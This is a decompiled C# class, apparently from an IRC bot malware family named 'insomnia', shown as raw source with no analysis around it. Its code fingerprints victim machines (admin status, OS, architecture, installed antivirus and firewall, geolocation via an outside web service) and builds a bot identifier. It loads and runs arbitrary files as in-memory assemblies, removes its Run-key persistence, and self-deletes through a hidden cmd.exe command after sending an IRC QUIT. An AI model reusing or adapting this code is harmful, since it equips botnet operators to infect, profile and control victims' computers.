using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace insomnia;

internal class Class39
{
	private const string Field6 = "abcdefghijklmnopqrstuvwxyz";

	private static readonly Random Field5 = new Random();

	public static bool Field4 = false;

	public static string Field3;

	public static string Field2 = "error";

	public static string Field1 = "";

	public static string Method21()
	{
		return Method10() + "{" + Method17() + "|" + Method19() + "-" + Method18() + Method20() + "}" + Class26.Field19;
	}

	public static string Method20()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) ? true : false)
		{
			return "a";
		}
		return "u";
	}

	public static string Method19()
	{
		string text = "";
		OperatingSystem oSVersion = Environment.OSVersion;
		if (oSVersion.Platform == PlatformID.Win32NT)
		{
			if (oSVersion.Version.Major == 5)
			{
				switch (oSVersion.Version.Minor)
				{
				case 0:
					text = "2K";
					break;
				case 1:
					text = "XP";
					break;
				case 2:
					text = "2k3";
					break;
				}
			}
			if (oSVersion.Version.Major == 6)
			{
				switch (oSVersion.Version.Minor)
				{
				case 0:
					text = "VI";
					break;
				case 1:
					text = "W7";
					break;
				case 2:
					text = "W8";
					break;
				}
			}
		}
		if (text == "")
		{
			text = "XP";
		}
		return text;
	}

	public static string Method18()
	{
		if (Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0")!.GetValue("Identifier")!.ToString()!.Contains("x86"))
		{
			return "32";
		}
		return "64";
	}

	public static string Method17()
	{
		try
		{
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString("http://api.wipmania.com/");
			string[] array = text.Split(new string[1] { "<br>" }, StringSplitOptions.None);
			Field2 = array[0];
			Field1 = array[1];
		}
		catch
		{
		}
		if (Field1 == "XX" || Field1 == "")
		{
			string threeLetterISORegionName = RegionInfo.CurrentRegion.ThreeLetterISORegionName;
			CultureInfo[] cultures = CultureInfo.GetCultures(CultureTypes.SpecificCultures);
			CultureInfo[] array2 = cultures;
			foreach (CultureInfo cultureInfo in array2)
			{
				RegionInfo regionInfo = new RegionInfo(cultureInfo.LCID);
				if (regionInfo.ThreeLetterISORegionName.ToUpper() == threeLetterISORegionName)
				{
					Field1 = regionInfo.TwoLetterISORegionName;
				}
			}
		}
		return Field1;
	}

	public static string Method16(string A_0)
	{
		try
		{
			AssemblyName.GetAssemblyName(A_0);
			Assembly assembly = Assembly.LoadFile(A_0);
			return ".NET " + assembly.ImageRuntimeVersion;
		}
		catch
		{
		}
		return "Native";
	}

	public static string Method15(string A_0)
	{
		string text = "N/A";
		string text2 = "";
		FileStream fileStream = null;
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		try
		{
			fileStream = Method14(A_0);
			byte[] array = mD5CryptoServiceProvider.ComputeHash(fileStream);
			fileStream.Close();
			text2 = BitConverter.ToString(array);
			return text2.Replace("-", "");
		}
		catch
		{
			return "N/A";
		}
	}

	private static FileStream Method14(string A_0)
	{
		return new FileStream(A_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
	}

	public static string Method13(int A_0)
	{
		char[] array = new char[A_0];
		for (int i = 0; i < A_0; i++)
		{
			array[i] = "abcdefghijklmnopqrstuvwxyz"[Field5.Next("abcdefghijklmnopqrstuvwxyz".Length)];
		}
		return new string(array);
	}

	public static int Method12(int A_0, int A_1)
	{
		return Field5.Next(A_0, A_1);
	}

	public static bool Method11(string A_0)
	{
		byte[] array = null;
		FileStream input = new FileStream(A_0, FileMode.Open, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(input);
		long length = new FileInfo(A_0).Length;
		array = binaryReader.ReadBytes((int)length);
		try
		{
			byte[] rawAssembly = array;
			Assembly.Load(rawAssembly).EntryPoint!.Invoke(null, null);
			return true;
		}
		catch
		{
			return false;
		}
	}

	public static string Method10()
	{
		try
		{
			DateTime creationTime = File.GetCreationTime(Class26.Field20);
			if (DateTime.Now.Subtract(creationTime).TotalHours > 1.0)
			{
				return "";
			}
			if (Class13.Field6)
			{
				return "nu";
			}
			return "n";
		}
		catch
		{
		}
		return "";
	}

	public static string Method9()
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		string result = "none";
		ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
		ManagementObjectCollection val2 = val.Get();
		ManagementObjectEnumerator enumerator = val2.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				result = ((ManagementBaseObject)val3).get_Item("displayName").ToString();
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string Method8()
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0043: Expected O, but got Unknown
		string result = "none";
		ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM FirewallProduct");
		ManagementObjectCollection val2 = val.Get();
		ManagementObjectEnumerator enumerator = val2.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				result = ((ManagementBaseObject)val3).get_Item("displayName").ToString();
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string Method7(long A_0)
	{
		string[] array = new string[4] { "GB", "MB", "KB", "Bytes" };
		long num = (long)Math.Pow(1024.0, array.Length - 1);
		string[] array2 = array;
		int num2 = 0;
		string arg;
		while (true)
		{
			if (num2 < array2.Length)
			{
				arg = array2[num2];
				if (A_0 > num)
				{
					break;
				}
				num /= 1024L;
				num2++;
				continue;
			}
			return "0 Bytes";
		}
		return $"{decimal.Divide(A_0, num):##.##} {arg}".Replace(",", ".");
	}

	public static void Method6(string A_0)
	{
		Field3 = A_0;
		Thread thread = new Thread(Method5);
		thread.Start();
	}

	private static void Method5()
	{
		byte[] rawAssembly = Method4(Field3);
		Assembly.Load(rawAssembly).EntryPoint!.Invoke(null, null);
	}

	public static byte[] Method4(string A_0)
	{
		byte[] array = null;
		FileStream input = new FileStream(A_0, FileMode.Open, FileAccess.Read);
		BinaryReader binaryReader = new BinaryReader(input);
		long length = new FileInfo(A_0).Length;
		return binaryReader.ReadBytes((int)length);
	}

	public static void Method3(string A_0, string A_1)
	{
		string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		RegistryKey registryKey = null;
		registryKey = ((!(A_0 == "HKCU")) ? Registry.LocalMachine.OpenSubKey(name, writable: true) : Registry.CurrentUser.OpenSubKey(name, writable: true));
		using (registryKey)
		{
			registryKey?.DeleteValue(A_1);
		}
	}

	public static void Method2(string A_0)
	{
		try
		{
			try
			{
				Class13.Field8.Method3();
				Method3(Class13.Field5, Class26.Field5);
			}
			catch
			{
			}
			Field4 = true;
			Class31.Field13.WriteLine("QUIT :" + A_0);
			Class31.Field13.Close();
			Class31.Field12.Close();
			Class31.Field11.Close();
			File.SetAttributes(Class26.Field20, FileAttributes.Normal);
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Class26.Field20;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "cmd.exe";
			Process.Start(processStartInfo);
			Environment.Exit(-1);
		}
		catch
		{
		}
	}

	public static void Method1(string A_0)
	{
		try
		{
			Class13.Field8.Method3();
			Class31.Field13.WriteLine("QUIT :" + A_0);
			Class31.Field13.Close();
			Class31.Field12.Close();
			Class31.Field11.Close();
		}
		catch
		{
		}
	}
}
